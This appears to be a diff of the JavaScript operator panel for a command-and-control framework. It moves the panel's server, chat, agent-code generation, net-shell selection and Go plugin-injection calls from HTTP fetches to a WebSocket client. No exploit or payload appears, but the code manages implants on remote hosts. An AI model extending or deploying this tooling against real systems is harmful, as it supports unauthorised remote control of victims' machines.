             const textarea = document.createElement("textarea");
             textarea.placeholder = "{\n  \"Content-Type\": \"application/json\",\n  \"Cache-Control\": \"no-cache\"\n}";
+            if (currentHeader) {
+                try {
+                    const parsedHeader = JSON.parse(currentHeader);
+                    textarea.value = JSON.stringify(parsedHeader, null, 2);
+                } catch (e) {
+                    textarea.value = currentHeader;
+                }
+            }
             dialog.appendChild(textarea);
-
             // 按钮容器
             const buttonContainer = document.createElement("div");
             buttonContainer.className = "button-container";
-
-            // 取消按钮
-            const cancelButton = document.createElement("button");
-            cancelButton.textContent = "Cancel";
-            cancelButton.onclick = () => {
-                document.body.removeChild(dialog);
-            };
-            buttonContainer.appendChild(cancelButton);
-
             // 保存按钮
             const saveButton = document.createElement("button");
             saveButton.textContent = "Save";
             saveButton.onclick = async () => {
-                try {
-                    const newHeader = textarea.value.trim(); // 获取用户输入的字符串
-
-                    // 如果输入为空，直接发送空字符串
-                    if (newHeader === "") {
-                        const response = await fetch("/` + web_route + `?op=changeResponseHead", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify({ port: port, response_head: "" }), // 发送空字符串
-                        });
-
-                        if (!response.ok) {
-                            const errorText = await response.text();
-                            alert("HTTP error!: " + errorText);
-                        } else {
-                            alert("Response header cleared successfully!");
-                            document.body.removeChild(dialog); // 关闭弹窗
+                const newHeader = textarea.value.trim();
+                if (newHeader !== "") {
+                    try {
+                        const parsedHeader = JSON.parse(newHeader);
+                        if (!parsedHeader || Array.isArray(parsedHeader) || typeof parsedHeader !== "object") {
+                            customAlert("Header must be a JSON object");
+                            return;
                         }
+                    } catch (err) {
+                        customAlert("Invalid JSON format. Please check your input.");
+                        console.error("Error modifying server header:", err);
                         return;
                     }
-
-                    // 验证 JSON 格式
-                    JSON.parse(newHeader);
-
-                    const response = await fetch("/` + web_route + `?op=changeResponseHead", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
+                }
+                try {
+                    const responsePromise = webSocketClient.waitForMessage(
+                        (msg) => {
+                            return msg.path === "changeResponseHead" &&
+                                String(msg.port || "") === String(port);
                         },
-                        body: JSON.stringify({ port: port, response_head: newHeader }), // 直接发送字符串
-                    });
-
-                    if (!response.ok) {
-                        const errorText = await response.text();
-                        alert("HTTP error!: " + errorText);
-                    } else {
-                        alert("Response header modified successfully!");
-                        document.body.removeChild(dialog); // 关闭弹窗
+                        15000
+                    );
+                    const sent = await webSocketClient.send(
+                        "changeResponseHead",
+                        {
+                            port: port,
+                            response_head: newHeader
+                        }
+                    );
+                    if (!sent) {
+                        customAlert("Send failed");
+                        return;
                     }
+                    const result = await responsePromise;
+                    if (!result || result.code !== 200) {
+                        customAlert(
+                            result && result.message ?
+                                result.message :
+                                "Modify response header failed"
+                        );
+                        return;
+                    }
+                    if (server) {
+                        server.response_head = newHeader;
+                        server.responseHead = newHeader;
+                        server.ResponseHead = newHeader;
+                    }
+                    customLog(
+                        newHeader === "" ?
+                            "Response header cleared successfully!" :
+                            "Response header modified successfully!"
+                    );
+                    document.body.removeChild(dialog);
                 } catch (err) {
-                    alert("Invalid JSON format. Please check your input.");
+                    customAlert("Modify response header failed");
                     console.error("Error modifying server header:", err);
                 }
             };
@@ -2113,19 +3523,16 @@ class lain_server {
     // 下载配置
     downloadConfig(port) {
         // 根据 port 找到对应的 server
-        const server = this.server_data.find(server => server.port === port);
+        const server = server_data.find(server => server.port === port);
         if (!server) {
-            alert("未找到服务器配置！");
+            customLog("Server not found for port: " + port);
             return;
         }
-    
         // 转换为 JSON 字符串
         const configData = JSON.stringify(server, null, 4);
-    
         // 创建 Blob 对象
         const blob = new Blob([configData], { type: "application/json" });
         const url = URL.createObjectURL(blob);
-    
         // 创建下载链接
         const a = document.createElement("a");
         a.href = url;
@@ -2133,136 +3540,117 @@ class lain_server {
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-    
         // 释放 URL
         URL.revokeObjectURL(url);
     }
-    
-    
-    redirectToAgentCode(os, port, protocol, path, connPath, msgPath, switch_key, encry_key, download, result, net, info, upload, list, option, user,uid, hostname, keyPart, filekey,code, windows_pro) {
-        const master = window.location.hostname + ":" + port;
-    
-        let queryParams = "os=" + encodeURIComponent(os) +
-            "&server=" + encodeURIComponent(master) +
-            "&Path=" + encodeURIComponent(path) +
-            "&ConnPath=" + encodeURIComponent(connPath) +
-            "&MsgPath=" + encodeURIComponent(msgPath) +
-            "&switch_key=" + encodeURIComponent(switch_key) +
-            "&encry_key=" + encodeURIComponent(encry_key) +
-            "&download=" + encodeURIComponent(download) +
-            "&result=" + encodeURIComponent(result) +
-            "&net=" + encodeURIComponent(net) +
-            "&info=" + encodeURIComponent(info) +
-            "&upload=" + encodeURIComponent(upload) +
-            "&list=" + encodeURIComponent(list) +
-            "&option=" + encodeURIComponent(option) +
-            "&username=" + this.username+
-            "&user=" + encodeURIComponent(user) +
-            "&uid=" + encodeURIComponent(uid) +
-            "&hostname=" + encodeURIComponent(hostname) +
-            "&keyPart=" + encodeURIComponent(keyPart) +
-            "&filekey=" + encodeURIComponent(filekey)+
-            "&code=" + encodeURIComponent(code);
-        if (windows_pro) {
-            queryParams += "&group_pro=" + encodeURIComponent(windows_pro);
+    async redirectToAgentCode(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,
+        download,result,net,info,upload,list,option,user,uid,hostname,keyPart,filekey,code,windows_pro){
+        try {
+            console.log(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,download,result,net,info,upload,list,option,user,uid,hostname,keyPart,filekey,code,windows_pro);
+            webSocketClient.send(
+                "agentcode",
+                {
+                    protocol: protocol,
+                    os: os,
+                    server: server,
+                    Path: path,
+                    ConnPath: connPath,
+                    MsgPath: msgPath,
+                    switch_key: switch_key,
+                    encry_key: encry_key,
+                    download: download,
+                    result: result,
+                    net: net,
+                    info: info,
+                    upload: upload,
+                    list: list,
+                    option: option,
+                    username:Username,
+                    user:user,
+                    uid:uid,
+                    hostname:hostname,
+                    keyPart:keyPart,
+                    filekey:filekey,
+                    code:code,
+                    group_pro:windows_pro || ""
+                }
+            );
+        }catch(e){
+            console.error(
+                "generate agent code failed",
+                e
+            );
         }
-    
-        const url = "/`+web_route+`?op=agentcode&protocol=" + encodeURIComponent(protocol) + "&" + queryParams;
-        window.location.href = url;
     }
-    
-    
-
-    checkTime() {
-        let check_url = "/`+web_route+`?op=checkclient";
-        setInterval(() => {
-            fetch(check_url)
-                .then(response => {
-                    if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
-                        return response.json();
-                    } else {
-                        throw new Error("Invalid JSON response");
-                    }
-                })
-                .then(data => {
-                    data.forEach(item => {
-                        let clientid = document.getElementById(item.port);
-                        if(clientid){
-                            clientid.innerHTML = item.client;
-                        }
-                    });
-                })
-                .catch(error => {
-                    console.error("Error fetching data:", error);
-                });
-        }, 5000);
+    checkAgent(data) {
+        rebuildServerClientCounts(data);
     }
 }
 
 class lain_chat{
-    constructor(){
-        this.username = this.getCookie("cookie");
-        this.chat_slice = [];
-    }
-    getCookie(name) {
-        let cookies = document.cookie.split('; ');
-        for (let i = 0; i < cookies.length; i++) {
-            let cookie = cookies[i];
-            let cookieParts = cookie.split('=');
-            if (cookieParts[0] === name) {
-                return cookieParts[2];
-            }
-        }
-        return null;
-    }
     renderChatItem(data) {
+        console.log("renderChatItem:", data);
+        if (!data) return;
+        // 如果传入的是接口完整返回 {data: []}
+
+        // 下面开始处理单条消息
         let chat_div = document.getElementById("chat_div");
+        if (!chat_div) return;
+    
         let div = document.createElement("div");
         div.className = "chat_message";
         div.setAttribute("data-chatid", data.chatid);
-
-        if (data.username === this.username) {
+    
+        // 自己的消息
+        if (data.username === Username) {
             div.classList.add("me");
         }
-
-        // ✅ 只有自己的消息才显示删除按钮
-        if (data.username === this.username) {
+    
+        // 头部
+        let header = document.createElement("div");
+        header.style.display = "flex";
+        header.style.justifyContent = "space-between";
+        header.style.alignItems = "center";
+    
+        let usernameSpan = document.createElement("strong");
+        usernameSpan.innerText = data.username;
+    
+        header.appendChild(usernameSpan);
+    
+        // 只有自己的消息显示删除按钮
+        if (data.username === Username || data.username === "history fil") {
             let delBtn = document.createElement("span");
             delBtn.innerText = "×";
-            delBtn.style.cssText = "float:right; cursor:pointer; color:#888; margin-left:8px;";
+            delBtn.style.cssText =
+                "cursor:pointer;color:#888;margin-left:8px;";
+    
             delBtn.title = "delete";
-            delBtn.onclick = () => this.deleteChat(data.chatid, data.message);
-
-            let header = document.createElement("div");
-            header.style.display = "flex";
-            header.style.justifyContent = "space-between";
-            header.style.alignItems = "center";
-
-            let usernameSpan = document.createElement("strong");
-            usernameSpan.innerText = data.username;
-
-            header.appendChild(usernameSpan);
+    
+            let currentChatId = data.chatid;
+            let currentMessage = data.message;
+            delBtn.onclick = () => {
+                this.deleteChat(currentChatId, currentMessage);
+            };
+    
             header.appendChild(delBtn);
-            div.appendChild(header);
-        } else {
-            let usernameSpan = document.createElement("strong");
-            usernameSpan.innerText = data.username;
-            div.appendChild(usernameSpan);
         }
-
+    
+        div.appendChild(header);
+        // 消息内容
         if (data.type === "file") {
             let link = document.createElement("a");
             link.href = "javascript:void(0);";
             link.className = "file_link";
             link.innerText = "📎 " + data.message;
+    
             link.style.color = "#007BFF";
             link.style.textDecoration = "none";
-            link.onclick = () => this.downloadChatFile(data.message);
-
+            link.onclick = () => {
+                this.downloadChatFile(data.message);
+            };
             let linkDiv = document.createElement("div");
             linkDiv.style.marginTop = "4px";
             linkDiv.appendChild(link);
-
             div.appendChild(linkDiv);
         } else {
             let msgDiv = document.createElement("div");
@@ -2270,166 +3658,197 @@ class lain_chat{
             msgDiv.innerText = data.message;
             div.appendChild(msgDiv);
         }
-
+        // 时间
         let timeSpan = document.createElement("span");
         timeSpan.className = "chat_time";
         timeSpan.innerText = data.time;
         div.appendChild(timeSpan);
-
         chat_div.appendChild(div);
+        // 自动滚到底部
         chat_div.scrollTop = chat_div.scrollHeight;
     }
-    async getNewChat() {
-        setInterval(async () => {
-            try {
-                let url = "/`+web_route+`?op=getNewChat";
-                let res = await fetch(url);
-                let data = await res.json();
-
-                if (!data || !data.chatid) return;
-
-                // 判断是否已经存在
-                if (this.chat_slice.some(item => item.chatid === data.chatid)) return;
-
-                this.chat_slice.push(data);
-                this.renderChatItem(data);
-
-            } catch (err) {
-                console.error("Error fetching new chat:", err);
-            }
-        }, 5000);
-    }
-    async getChatSlice() {
-        try {
-            let res = await fetch("/`+web_route+`?op=getChatSlice");
-            let chat_data = await res.json();
-            this.chat_slice = chat_data;
-
-            let chat_div = document.getElementById('chat_div');
-            chat_div.innerHTML = '';
-
-            chat_data.forEach(item => {
-                this.renderChatItem(item);
-            });
-
-        } catch (error) {
-            this.chat_slice = [];
-        }
-    }
     async sendChat() {
-        if (!this.chat_slice) this.chat_slice = [];
-        let chat_input = document.getElementById("chat_input").value.trim();
-        if (chat_input === "") return;
-        let chatid = this.chat_slice.length > 0
-            ? this.chat_slice[this.chat_slice.length - 1].chatid + 1
-            : 1;
-        let payload = {
-            username: this.username,
-            message: chat_input,
-            chatid: chatid,
-            Type: "text"
-        };
+        if (!chat_slice) {
+            chat_slice = [];
+        }
+        let chat_input =
+            document.getElementById("chat_input")
+            .value
+            .trim();
+        if (chat_input === "") {
+            return;
+        }
         try {
-            let res = await fetch("/`+web_route+`?op=sendChat", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify(payload)
-            });
-            let data = await res.json();
-            this.chat_slice.push(data);
-            this.renderChatItem(data);
-            document.getElementById("chat_input").value = "";
-        } catch (error) {
-            console.error("Error in sendChat:", error);
+            webSocketClient.send(
+                "sendChat",
+                {
+                    username:Username,
+                    message:chat_input,
+                }
+            );
+        }catch(error){
+            console.error(
+                "Error in sendChat:",
+                error
+            );
         }
     }
-    async deleteChat(chatid , message) {
+    async deleteChat(chatid, message) {
         try {
-            var url = "/`+web_route+`?op=deleteChat";
-            var payload = {
-                chatid: chatid,
-                username: this.username,
-                message: message,
-            };
-            var res = await fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            });
-            var data = await res.json();
-            if (data.status === "deleted") {
-                // 1. 从本地 this.chat_slice 删除
-                this.chat_slice = this.chat_slice.filter(function(item){
-                    return item.chatid !== chatid;
-                });
-                // 2. 从 DOM 中删除对应 div
-                var chat_div = document.getElementById("chat_div");
-                var msgNode = chat_div.querySelector('[data-chatid="' + chatid + '"]');
-                if (msgNode) {
-                    msgNode.remove();
+            webSocketClient.send(
+                "deleteChat",
+                {
+                    chatid: String(chatid),
+                    username: Username,
+                    message: message
                 }
-            } else {
-                console.warn("Delete failed:", data);
-            }
-        } catch (error) {
-            console.error("Error in deleteChat:", error);
+            );
+        }catch(error){
+            console.error(
+                "Error in deleteChat:",
+                error
+            );
         }
     }
     async sendChatFile() {
-        var fileInput = document.getElementById("chat_file");
-        if (!fileInput.files.length) return;
-        var file = fileInput.files[0];
-        var chatid = this.chat_slice.length > 0
-            ? this.chat_slice[this.chat_slice.length - 1].chatid + 1
-            : 1;
-        var chat_div = document.getElementById("chat_div");
-        var pendingDiv = document.createElement("div");
-        pendingDiv.className = "chat_message me pending_file";
-        pendingDiv.innerText = "📎 " + file.name + " (" + Math.round(file.size / 1024) + " KB) - sending...";
-        chat_div.appendChild(pendingDiv);
-        chat_div.scrollTop = chat_div.scrollHeight;
-        var formData = new FormData();
-        formData.append("username", this.username);
-        formData.append("chatid", chatid);
-        formData.append("chatFile", file);
-        try {
-            var res = await fetch("/`+web_route+`?op=chatFile", {
-                method: "POST",
-                body: formData
-            });
-            var data = await res.json();
-            chat_div.removeChild(pendingDiv);
-            this.chat_slice.push(data);
-            this.renderChatItem(data);
-        } catch (e) {
-            pendingDiv.innerText = "❌ " + file.name + " (Sending failed)";
-            pendingDiv.style.color = "red";
+        let fileInput = document.getElementById("chat_file");
+        if(!fileInput.files.length){
+            return;
         }
-        fileInput.value = "";
+        let file = fileInput.files[0];
+        let chatid = chat_slice.length > 0 ? chat_slice[chat_slice.length - 1].chatid + 1 : 1;
+        let chat_div = document.getElementById("chat_div");
+        let pendingDiv = document.createElement("div");
+        pendingDiv.className = "chat_message me pending_file";
+        pendingDiv.innerText =
+            "📎 "
+            + file.name
+            + " ("
+            + Math.round(file.size/1024)
+            + " KB) - sending...";
+        chat_div.appendChild(pendingDiv);
+        chat_div.scrollTop =
+            chat_div.scrollHeight;
+        try{
+            await webSocketClient.sendFile(
+                "chatFile",
+                {
+                    filename:file.name,
+                    chatid:String(chatid),
+                    username:Username
+                },
+                file,
+                1024 * 1024,
+                (offset, total)=>{
+                    let percent = total === 0
+                        ? 100
+                        : Math.min(
+                            100,
+                            Math.floor(offset / total * 100)
+                        );
+                    pendingDiv.innerText =
+                        "📎 "
+                        + file.name
+                        + " "
+                        + percent
+                        + "%";
+                }
+            );
+            pendingDiv.innerText =
+                "📎 "
+                + file.name
+                + " uploaded";
+        }catch(e){
+            console.error(
+                "upload error:",
+                e
+            );
+            pendingDiv.innerText =
+                "❌ "
+                + file.name
+                + " failed";
+            pendingDiv.style.color="red";
+        }
+        fileInput.value="";
     }
     async downloadChatFile(filename){
-        // 构造下载 URL
-        let url = "/`+web_route+`?op=downloadChatFile"
-                + "&filename=" + encodeURIComponent(filename);
-        // 直接打开新窗口下载
-        window.open(url, "_blank");
+        try {
+            await webSocketClient.downloadFile(
+                "downloadChatFile",
+                {
+                    filename: filename
+                }
+            );
+        } catch(err){
+            console.error(
+                "download error:",
+                err
+            );
+            customLog("Download failed");
+        }
     }
 }
 
-function net_init(shell_list) {
+function net_init() {
     try {
         const selectElement = document.getElementById('net_shell');
+        if (!selectElement) {
+            if (!window.netInitTimer) {
+                window.netInitTimer = setInterval(function() {
+                    if (net_init()) {
+                        clearInterval(window.netInitTimer);
+                        window.netInitTimer = null;
+                    }
+                }, 300);
+            }
+            return false;
+        }
+        if ((!Array.isArray(shell_list) || shell_list.length === 0) &&
+            Array.isArray(User_data) && User_data.length > 0) {
+            shell_list = User_data.slice();
+            window.shell_list = shell_list;
+        }
+        if (!Array.isArray(shell_list) || shell_list.length === 0) {
+            if (!window.netInitTimer) {
+                window.netInitTimer = setInterval(function() {
+                    if (net_init()) {
+                        clearInterval(window.netInitTimer);
+                        window.netInitTimer = null;
+                    }
+                }, 300);
+            }
+            return false;
+        }
+        const currentValue = selectElement.value;
         selectElement.innerHTML = '<option value="">Select</option>';
         shell_list.forEach(item => {
+            if (!item || !item.uid) {
+                return;
+            }
             const option = document.createElement('option');
             option.value = item.uid; // UID
-            option.textContent = item.host;
+            const hostText = item.host || item.hostname || item.username || "";
+            option.textContent = hostText ? (hostText + " (" + item.uid + ")") : item.uid;
             selectElement.appendChild(option);
         });
+        if (currentValue) {
+            selectElement.value = currentValue;
+        }
+        if (selectElement.dataset.netChangeBound !== "true") {
+            selectElement.dataset.netChangeBound = "true";
+            selectElement.addEventListener("change", function() {
+                const net = new lain_net();
+                net.requestNetData(this.value);
+            });
+        }
+        if (window.netInitTimer) {
+            clearInterval(window.netInitTimer);
+            window.netInitTimer = null;
+        }
+        return true;
     } catch (error) {
         console.error("error:", error);
+        return false;
     }
 }
 function toggleInfo(uid,op) {
@@ -2532,24 +3951,6 @@ document.addEventListener("DOMContentLoaded", function () {
     logHandle.addEventListener("mousedown", startResize);
     logHandle.addEventListener("touchstart", startResize);
 
-    // **自动更新日志内容**
-    setInterval(function () {
-        var url = "/`+web_route+`?op=logRead&pos=50";
-        fetch(url)
-            .then(function (response) { return response.json(); })
-            .then(function (data) {
-                var html = "";
-                for (var i = 0; i < data.length; i++) {
-                    var entry = data[i];
-                    html += "[" + entry.time + "]   :   " + entry.message + "\n";
-                }
-                document.getElementById("log-content").innerText = html;
-            })
-            .catch(function (err) {
-                console.error("read log error:", err);
-            });
-    }, 3000);
-
     // **iframe 拖动**
     const iframePanel = document.getElementById("iframePanel");
     const dragHandle = iframePanel.querySelector(".drag-handle");
@@ -2651,7 +4052,7 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
     // 解析参数
     let paramDescArray = paramDescList ? decodeURIComponent(paramDescList).split(',') : [];
     if (!uid || !os || !paramDescList || !codeword) {
-        alert("缺少必要参数");
+        customAlert("Missing required parameters for plugin dialog.");
         return;
     }
 
@@ -2715,37 +4116,439 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
     dialog.appendChild(submitButton);
 
     // 发送消息函数
-    function sendMsg() {
+    async function sendMsg() {
         let inputs = dialog.querySelectorAll('input[type="text"]');
         let msgParts = [];
         for (let input of inputs) {
             let value = input.value.trim();
             if (!value) {
-                alert("Please fill in all fields.");
+                customAlert("Please fill in all fields.");
                 return;
             }
             msgParts.push(value);
         }
         let msg = codeword + '*//*' + msgParts.join('*//*');
-        fetch('/`+web_route+`?op=msg&uid=' + encodeURIComponent(uid) + '&msg=' + encodeURIComponent(msg) + '&Taskid=pluginTask', {
-            method: 'GET'
-        })
-        .then(response => {
-            if (response.ok) {
-                alert("Message sent successfully!");
-                inputs.forEach(input => input.value = '');
-            } else {
-                return response.text().then(text => {
-                    throw new Error(text);
-                });
-            }
-        })
-        .catch(error => {
-            console.error("Failed to send message:", error);
-            alert("Failed to send message: " + error.message);
-        });
+        try {
+            let result = await webSocketClient.send(
+                
+                "msg",
+                {
+                    uid: uid,
+                    msg: msg,
+                }
+            );
+            customLog("Message sent successfully!");
+            inputs.forEach(input => {
+                input.value = '';
+            });
+        } catch(error) {
+            console.error(
+                "Failed to send message:",
+                error
+            );
+            customLog(
+                "Failed to send message: " + error.message
+            );
+        }
     }
 }
+async function submitPlugin(remark) {
+    const dialog = document.getElementById("serverDialog");
+    if (!dialog) {
+        customAlert("Plugin dialog not found");
+        return false;
+    }
+    const finalRemark = (remark || dialog.dataset.remark || "").trim();
+    const osSelect = dialog.querySelector("#select_os");
+    const codeWordInput = dialog.querySelector("input[name='codeWord']");
+    const codeInput = dialog.querySelector("input[name='code']");
+    const parameterCountInput = dialog.querySelector("#parameterHidden");
+    const parameterDescInput = dialog.querySelector("input[name='parameterDec']");
+
+    const osName = osSelect ? osSelect.value.trim() : "";
+    const codeWords = codeWordInput ? codeWordInput.value.trim() : "";
+    const rawCode = codeInput ? codeInput.value.trim() : "";
+    const parameterDesc = parameterDescInput ? parameterDescInput.value.trim() : "";
+    const parameterCount = parameterCountInput ?
+        Math.max(1, parseInt(parameterCountInput.value, 10) || 1) :
+        1;
+    const codeParts = Array.from(
+        { length: parameterCount },
+        function(_, index) {
+            return "msg" + (index + 1);
+        }
+    );
+    const parameter = codeParts.join(",");
+
+    if (!finalRemark || !rawCode || !osName) {
+        customAlert("remark, code and os are required");
+        return false;
+    }
+    if (!codeWords) {
+        customAlert("codeWord is required");
+        return false;
+    }
+    if (!parameterDesc) {
+        customAlert("parameter description is required");
+        return false;
+    }
+
+    const submitBtn = dialog.querySelector("#submitBtn");
+    if (submitBtn) {
+        submitBtn.disabled = true;
+    }
+    try {
+        const parameterDescArray = parameterDesc.split(",").map(function(part) {
+            return part.trim();
+        }).filter(function(part) {
+            return part !== "";
+        });
+        while (parameterDescArray.length < parameterCount) {
+            parameterDescArray.push("null");
+        }
+        const normalizedParameterDesc = parameterDescArray.join(",");
+        const funcParams = codeParts.map(function(part) {
+            return part + " string";
+        }).join(", ");
+        const callParams = codeParts.map(function(_, index) {
+            return "msg[" + (index + 1) + "]";
+        }).join(", ");
+        let finalCodeBody = rawCode;
+        for (let i = 1; i <= parameterCount; i++) {
+            const regex = new RegExp("msg-" + i, "g");
+            finalCodeBody = finalCodeBody.replace(regex, "msg" + i);
+        }
+        const finalCode = 'case "' + codeWords + '":\n    go func(' +
+            funcParams +
+            ') {' +
+            finalCodeBody +
+            '}(' +
+            callParams +
+            ')';
+        const sent = await webSocketClient.send(
+            "insertPlugin",
+            {
+                remark: finalRemark,
+                code: finalCode,
+                codeWords: codeWords,
+                os: osName,
+                parameter: parameter,
+                parameterDesc: normalizedParameterDesc
+            }
+        );
+        if (!sent) {
+            customAlert("insertPlugin send failed");
+            return false;
+        }
+        customLog("insertPlugin sent:", {
+            remark: finalRemark,
+            os: osName,
+            codeWords: codeWords,
+            parameter: parameter,
+            parameterDesc: normalizedParameterDesc,
+            code: finalCode
+        });
+        return true;
+    } catch (err) {
+        customAlert("insertPlugin failed: " + err.message);
+        return false;
+    } finally {
+        if (submitBtn) {
+            submitBtn.disabled = false;
+        }
+    }
+}
+window.submitPlugin = submitPlugin;
+function formatCustomLogValue(value) {
+    if (typeof value === "string") {
+        return value;
+    }
+    if (value instanceof Error) {
+        return value.stack || value.message;
+    }
+    if (typeof value === "undefined") {
+        return "undefined";
+    }
+    if (value === null) {
+        return "null";
+    }
+    try {
+        return JSON.stringify(value, null, 2);
+    } catch (err) {
+        return String(value);
+    }
+}
+function customLog() {
+    let container = document.getElementById("custom-log-container");
+    if (!container) {
+        container = document.createElement("div");
+        container.id = "custom-log-container";
+        container.style.position = "fixed";
+        container.style.right = "20px";
+        container.style.top = "20px";
+        container.style.width = "360px";
+        container.style.maxWidth = "calc(100vw - 24px)";
+        container.style.maxHeight = "50vh";
+        container.style.overflowY = "auto";
+        container.style.zIndex = "9998";
+        container.style.display = "flex";
+        container.style.flexDirection = "column";
+        container.style.gap = "10px";
+        document.body.appendChild(container);
+    }
+
+    const args = Array.from(arguments);
+    const item = document.createElement("div");
+    item.style.background = "rgba(255, 255, 255, 0.96)";
+    item.style.color = "#2f2f2f";
+    item.style.border = "1px solid rgba(120, 150, 180, 0.22)";
+    item.style.borderRadius = "10px";
+    item.style.padding = "12px 14px";
+    item.style.boxShadow = "0 10px 28px rgba(80, 102, 125, 0.18)";
+    item.style.fontFamily = "Consolas, Monaco, monospace";
+    item.style.fontSize = "12px";
+    item.style.lineHeight = "1.5";
+    item.style.wordBreak = "break-word";
+    item.style.opacity = "0";
+    item.style.transform = "translateY(-10px)";
+    item.style.transition = "opacity 0.6s ease, transform 0.6s ease";
+
+    const header = document.createElement("div");
+    header.style.display = "flex";
+    header.style.justifyContent = "space-between";
+    header.style.alignItems = "center";
+    header.style.marginBottom = "6px";
+
+    const timeLabel = document.createElement("span");
+    timeLabel.textContent = new Date().toLocaleTimeString();
+    timeLabel.style.color = "#4c84b8";
+    timeLabel.style.fontSize = "11px";
+
+    const closeButton = document.createElement("button");
+    closeButton.type = "button";
+    closeButton.textContent = "x";
+    closeButton.style.border = "none";
+    closeButton.style.background = "transparent";
+    closeButton.style.color = "#7e8a96";
+    closeButton.style.cursor = "pointer";
+    closeButton.style.fontSize = "14px";
+    closeButton.onclick = function() {
+        if (item.parentNode) {
+            item.parentNode.removeChild(item);
+        }
+    };
+
+    header.appendChild(timeLabel);
+    header.appendChild(closeButton);
+
+    const content = document.createElement("pre");
+    content.textContent = args.map(formatCustomLogValue).join(" ");
+    content.style.margin = "0";
+    content.style.whiteSpace = "pre-wrap";
+    content.style.wordBreak = "break-word";
+
+    item.appendChild(header);
+    item.appendChild(content);
+    container.appendChild(item);
+    requestAnimationFrame(() => {
+        item.style.opacity = "1";
+        item.style.transform = "translateY(0)";
+    });
+
+    while (container.children.length > 12) {
+        container.removeChild(container.firstChild);
+    }
+
+    container.scrollTop = container.scrollHeight;
+
+    let fadeTimer = null;
+    let removeTimer = null;
+    const startFadeOut = function() {
+        item.style.opacity = "0";
+        item.style.transform = "translateY(-6px)";
+        removeTimer = setTimeout(() => {
+            if (item.parentNode) {
+                item.parentNode.removeChild(item);
+            }
+        }, 650);
+    };
+    const scheduleFadeOut = function() {
+        clearTimeout(fadeTimer);
+        clearTimeout(removeTimer);
+        fadeTimer = setTimeout(startFadeOut, 4500);
+    };
+    item.onmouseenter = function() {
+        clearTimeout(fadeTimer);
+        clearTimeout(removeTimer);
+        item.style.opacity = "1";
+        item.style.transform = "translateY(0)";
+    };
+    item.onmouseleave = function() {
+        scheduleFadeOut();
+    };
+    scheduleFadeOut();
+}
+// 替代alert函数，使用自定义弹窗
+function customAlert(message) {
+    // 遮罩
+    let overlay = document.createElement("div");
+    overlay.style.position = "fixed";
+    overlay.style.inset = "0";
+    overlay.style.background = "rgba(0,0,0,0.35)";
+    overlay.style.zIndex = "9999";
+
+    // 弹窗
+    let alertBox = document.createElement("div");
+    alertBox.style.position = "fixed";
+    alertBox.style.top = "50%";
+    alertBox.style.left = "50%";
+    alertBox.style.transform = "translate(-50%, -50%)";
+    alertBox.style.background = "#fff";
+    alertBox.style.width = "500px";
+    alertBox.style.maxWidth = "85%";
+    alertBox.style.maxHeight = "70vh";
+    alertBox.style.borderRadius = "12px";
+    alertBox.style.boxShadow = "0 10px 30px rgba(0,0,0,0.25)";
+    alertBox.style.padding = "20px";
+    alertBox.style.zIndex = "10000";
+    alertBox.style.fontFamily = "Arial, sans-serif";
+    alertBox.style.overflow = "auto";
+
+    // 关闭按钮
+    let closeButton = document.createElement("button");
+    closeButton.innerHTML = "×";
+    closeButton.style.position = "absolute";
+    closeButton.style.right = "12px";
+    closeButton.style.top = "8px";
+    closeButton.style.width = "32px";
+    closeButton.style.height = "32px";
+    closeButton.style.border = "none";
+    closeButton.style.background = "transparent";
+    closeButton.style.fontSize = "26px";
+    closeButton.style.cursor = "pointer";
+    closeButton.style.color = "#666";
+    closeButton.onmouseenter = () => {
+        closeButton.style.color = "#000";
+    };
+    closeButton.onmouseleave = () => {
+        closeButton.style.color = "#666";
+    };
+    closeButton.onclick = function () {
+        document.body.removeChild(overlay);
+    };
+    alertBox.appendChild(closeButton);
+    // 内容
+    let messageText = document.createElement("pre");
+    messageText.textContent = message;
+    messageText.style.textAlign = "left";
+    messageText.style.whiteSpace = "pre-wrap";
+    messageText.style.wordBreak = "break-word";
+    messageText.style.fontSize = "14px";
+    messageText.style.lineHeight = "1.5";
+    messageText.style.marginTop = "25px";
+    messageText.style.color = "#333";
+    alertBox.appendChild(messageText);
+    overlay.appendChild(alertBox);
+    document.body.appendChild(overlay);
+    // 点击遮罩关闭
+    overlay.onclick = function(e) {
+        if (e.target === overlay) {
+            document.body.removeChild(overlay);
+        }
+    };
+}
+function customConfirm(message) {
+    return new Promise((resolve) => {
+        // 遮罩
+        let overlay = document.createElement("div");
+        overlay.style.position = "fixed";
+        overlay.style.inset = "0";
+        overlay.style.background = "rgba(0,0,0,0.35)";
+        overlay.style.zIndex = "9999";
+
+        // 弹窗
+        let confirmBox = document.createElement("div");
+        confirmBox.style.position = "fixed";
+        confirmBox.style.top = "50%";
+        confirmBox.style.left = "50%";
+        confirmBox.style.transform = "translate(-50%, -50%)";
+        confirmBox.style.background = "#fff";
+        confirmBox.style.width = "400px";
+        confirmBox.style.maxWidth = "85%";
+        confirmBox.style.borderRadius = "12px";
+        confirmBox.style.boxShadow = "0 10px 30px rgba(0,0,0,0.25)";
+        confirmBox.style.padding = "25px";
+        confirmBox.style.zIndex = "10000";
+        confirmBox.style.fontFamily = "Arial, sans-serif";
+        confirmBox.style.textAlign = "center";
+
+        // 内容
+        let messageText = document.createElement("div");
+        messageText.textContent = message;
+        messageText.style.fontSize = "16px";
+        messageText.style.color = "#333";
+        messageText.style.marginBottom = "25px";
+        messageText.style.whiteSpace = "pre-wrap";
+
+        confirmBox.appendChild(messageText);
+
+        // 按钮容器
+        let buttonBox = document.createElement("div");
+        buttonBox.style.display = "flex";
+        buttonBox.style.justifyContent = "center";
+        buttonBox.style.gap = "20px";
+
+        // 确定按钮
+        let okButton = document.createElement("button");
+        okButton.textContent = "yes";
+        okButton.style.width = "90px";
+        okButton.style.padding = "8px";
+        okButton.style.border = "none";
+        okButton.style.borderRadius = "6px";
+        okButton.style.background = "#2196f3";
+        okButton.style.color = "#fff";
